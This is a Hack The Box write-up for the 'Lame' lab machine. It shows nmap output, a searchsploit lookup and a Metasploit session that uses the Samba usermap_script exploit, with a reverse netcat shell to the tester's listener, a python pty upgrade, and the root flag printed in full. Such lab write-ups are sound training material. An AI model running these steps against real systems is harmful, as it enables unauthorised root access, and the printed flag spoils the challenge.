# Lame
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Lame
* Topic: [[Metasploit]]
* Difficulty: Easy
* Date: 20-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Flag:
Nmap:

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -n -sC -sV -Pn 10.10.10.3
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 04:28 EDT
Nmap scan report for 10.10.10.3
Host is up (0.070s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-04-20T04:28:59-04:00
|_clock-skew: mean: 2h00m21s, deviation: 2h49m44s, median: 19s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.42 seconds

```

We have a few common protocols running on the target. Let's first see if we can find a useful exploit via Metasploit.  

We can use `searchsploit` to quickly search for vulnerabilities in the Metasploit database.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ searchsploit samba 3.0                      
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                              | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                    | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                  | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                              | linux/remote/
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                            | solaris/remot
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                            | linux/dos/473
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                   | multiple/dos/
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                    | linux/remote/
Samba < 3.0.20 - Remote Heap Overflow                                                                                               | linux/remote/
Samba < 3.0.20 - Remote Heap Overflow                                                                                               | linux/remote/
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                       | linux_x86/dos
------------------------------------------------------------------------------------------------------------------------------------ --------------
Shellcodes: No Results
```

`Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)` seems promising.

Let's fire up Metasploit and give it a try.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo msfdb init && msfconsole
[sudo] password for kali: 
[i] Database already started
[i] The database appears to be already configured, skipping initialization

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________                       
         \ _ /            |\                       
          o_o \   M S F   | \                          
               \   _____  |  *                          
                |||   WW|||                            
                |||     |||                                                                       

       =[ metasploit v6.1.37-dev                          ]
+ -- --=[ 2212 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 615 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try 
globally setting it with setg RHOSTS x.x.x.x

msf6 > search samba 3.0

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script         2007-05-14       excellent  No     Samba "username map script" Command Execution
   1  exploit/linux/samba/chain_reply            2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   2  exploit/linux/samba/lsa_transnames_heap    2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   3  exploit/osx/samba/lsa_transnames_heap      2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   4  exploit/solaris/samba/lsa_transnames_heap  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow


Interact with a module by name or index. For example info 4, use 4 or use exploit/solaris/samba/lsa_transnames_heap
```

We will use exploit number `0`.

```
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.177.135  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

We need to set `RHOST` and `LHOST` to respectively the target machine (RemoteHOST) and our own machine (LocalHOST).  Then execute the exploit command.

```
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.3
LHOST => 10.10.14.3
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
ls[*] Command shell session 1 opened (10.10.14.3:4444 -> 10.10.10.3:40043 ) at 2022-04-20 15:08:34 -0400

python -c 'import pty;pty.spawn("/bin/bash")'
root@lame:/# cd root
```

We got shell. 

Now we just need to find the flag.

```
lroot@lame:/root# ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# cat root.txt
5d55abdf8bdbd1ab2fad37ae48573605
```

**Flag:** `5d55abdf8bdbd1ab2fad37ae48573605`

---
**Tags:** [[HackTheBox]]